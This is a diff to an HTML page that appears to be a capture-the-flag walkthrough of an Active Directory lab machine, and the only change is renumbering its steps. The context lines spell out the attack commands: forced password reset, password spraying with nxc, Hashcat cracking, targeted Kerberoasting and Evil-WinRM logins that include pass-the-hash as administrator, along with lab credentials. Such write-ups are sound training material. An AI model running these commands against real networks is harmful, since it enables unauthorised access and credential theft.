@@ -55,14 +55,14 @@
 
             <!-- Step 4 -->
             <section class="step">
-                <h2>Step 4: Dump AD Json using Bloodhound Python and Analysis</h2>
+                <h2>Step 5: Dump AD Json using Bloodhound Python and Analysis</h2>
                 <p>Dump data for BloodHound analysis to find potential attack paths within the Active Directory.</p>
                 <p class="command-line">Command: <code>bloodhound-python -v -u Olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c All</code></p>
             </section>
 
             <!-- Step 5 -->
             <section class="step">
-                <h2>Step 5: Force Change Password</h2>
+                <h2>Step 6: Force Change Password</h2>
                 <p>Force Change Password of a Benjamin Account Using Linux Command.</p>
                 <p class="command-line">Command: <code>net rpc password "benjamin" "Batman@123" -U "administrator.htb"/"michael"%"Password123" -S "administrator.htb"</code></p>
                 <p><strong>Username: </strong>Benjamin</p>
@@ -71,7 +71,7 @@
 
             <!-- Step 6 -->
             <section class="step">
-                <h2>Step 6: SMB Client Authentication</h2>
+                <h2>Step 7: SMB Client Authentication</h2>
                 <p>Verify User Using SMB Client Authentication</p>
                 <p class="command-line">Command: <code>smbclient -L administrator.htb -U Benjamin</code></p>
                 <p class="command-line">Command: <code>smbclient //administrator.htb/IPC$ -U benjamin</code></p>
@@ -81,14 +81,14 @@
 
             <!-- Step 7 -->
             <section class="step">
-                <h2>Step 7: SMBMap.</h2>
+                <h2>Step 8: SMBMap.</h2>
                 <p>List all the Available Shares for the Perticular User.</p>
                 <p class="command-line">Command: <code>smbmap -H 10.10.11.42 -u 'benjamin' -p 'Batman@123'</code></p>
             </section>
 
             <!-- Step 8 -->
             <section class="step">
-                <h2>Step 8: Optional Steps</h2>
+                <h2>Step 9: Optional Steps</h2>
                 <p>Move file to remote machine, first run python web server and use Invoke command to download file from python server.</p>
                 <p class="command-line">Command: <code>python3 -m http.server 8000</code></p>
                 <p>Run the following  on Powershell to download the file.</p>
@@ -99,7 +99,7 @@
 
             <!-- Step 9 -->
             <section class="step">
-                <h2>Step 9: SMB Bruteforcing. </h2>
+                <h2>Step 10: SMB Bruteforcing. </h2>
                 <p>SMB Username and Password Bruteforcing using nxc.</p>
                 <p class="command-line">Command: <code>nxc smb 10.10.11.42 -u /home/kali/Username.txt  -p /home/kali/Password.txt --continue-on-success</code></p>
                 <p>Valid Credentials</p>
@@ -110,7 +110,7 @@
 
             <!-- Step 10 -->
             <section class="step">
-                <h2>Step 10: LDAP Bruteforcing. </h2>
+                <h2>Step 11: LDAP Bruteforcing. </h2>
                 <p>LDAP Username and Password Bruteforcing using nxc.</p>
                 <p class="command-line">Command: <code>nxc ldap 10.10.11.42 -u /home/kali/Username.txt  -p /home/kali/Password.txt --continue-on-success</code></p>
                 <p>Valid Credentials</p>
@@ -121,7 +121,7 @@
 
             <!-- Step 11 -->
             <section class="step">
-                <h2>Step 11: Winrm Bruteforcing. </h2>
+                <h2>Step 12: Winrm Bruteforcing. </h2>
                 <p>Winrm Username and Password Bruteforcing using nxc.</p>
                 <p class="command-line">Command: <code>nxc winrm 10.10.11.42 -u /home/kali/Username.txt  -p /home/kali/Password.txt --continue-on-success</code></p>
                 <p>Valid Credentials</p>
@@ -132,7 +132,7 @@
 
             <!-- Step 12 -->
             <section class="step">
-                <h2>Step 12: FTP Bruteforcing. </h2>
+                <h2>Step 13: FTP Bruteforcing. </h2>
                 <p>FTP Username and Password Bruteforcing using nxc.</p>
                 <p class="command-line">Command: <code>nxc ftp 10.10.11.42 -u /home/kali/Username.txt  -p /home/kali/Password.txt --continue-on-success</code></p>
                 <p>Valid Credentials</p> 
@@ -144,7 +144,7 @@
 
             <!-- Step 13 -->
             <section class="step">
-                <h2>Step 13: Decrypt Backup.psafe3 with Hashcat to get master password.. </h2>
+                <h2>Step 14: Decrypt Backup.psafe3 with Hashcat to get master password.. </h2>
                 <p>Decrypt the hash that we have downloaded from the FTP server using Hashcat.</p>
                 <p class="command-line">Command: <code>hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt</code></p>
                 <p><strong>Master Password: </strong>tekieromucho</p> 
@@ -162,7 +162,7 @@
 
             <!-- Step 14 -->
             <section class="step">
-                <h2>Step 14: FTP Bruteforcing. </h2>
+                <h2>Step 15: FTP Bruteforcing. </h2>
                 <p>SMB Username and Password Bruteforcing using nxc to get valid credential from the above users that we have enumerated.</p>
                 <p class="command-line">Command: <code>nxc smb 10.10.11.42 -u /home/kali/Username.txt  -p /home/kali/Password.txt --continue-on-success</code></p>
                 <p>Valid Credentials</p> 
@@ -172,7 +172,7 @@
 
             <!-- Step 15 -->
             <section class="step">
-                <h2>Step 15: Evil-WinRM Access</h2>
+                <h2>Step 16: Evil-WinRM Access</h2>
                 <p>Use Evil-WinRM to connect to the machine as emily and get a user flag.</p>
                 <p class="command-line">Command: <code>evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUs_xxx_VTj8yQFKoHjXmb'</code></p>
                 <p><strong>User Flag:</strong> 81adf62c90e62_xxx_370dcf42d89f198</p>
@@ -180,7 +180,7 @@
 
             <!-- Step 16 -->
             <section class="step">
-                <h2>Step 16: TargetedKerberoast Attack</h2>
+                <h2>Step 17: TargetedKerberoast Attack</h2>
                 <p>Before startig we need to Synchronize administrator.htb NTP.</p>
                 <p class="command-line">Command: <code>apt install ntpdate</code></p>
                 <p><img src="./Asset/NTP Install.png" width="750px"></p>NTP Update
@@ -194,7 +194,7 @@
 
             <!-- Step 17 -->
             <section class="step">
-                <h2>Step 17: Crack TGT Hash</h2>
+                <h2>Step 18: Crack TGT Hash</h2>
                 <p>Cracking TGT Hash using Hashcat.</p>
                 <p class="command-line">Command: <code>hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p>
                 <p><img src="./Asset/Hashcat1.png" width="750px"></p>
@@ -208,7 +208,7 @@
 
             <!-- Step 18 -->
             <section class="step">
-                <h2>Step 18: Evil-WinRM Access</h2>
+                <h2>Step 19: Evil-WinRM Access</h2>
                 <p>Use Evil-WinRM to connect to the machine as administrator and get a root flag.</p>
                 <p class="command-line">Command: <code>evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd2_xxx_e098d2d2fd2e'</code></p>
                 <p><strong>Root Flag: </strong>dab35e1b8bb0_xxx_bc616e736ac24fe</p>
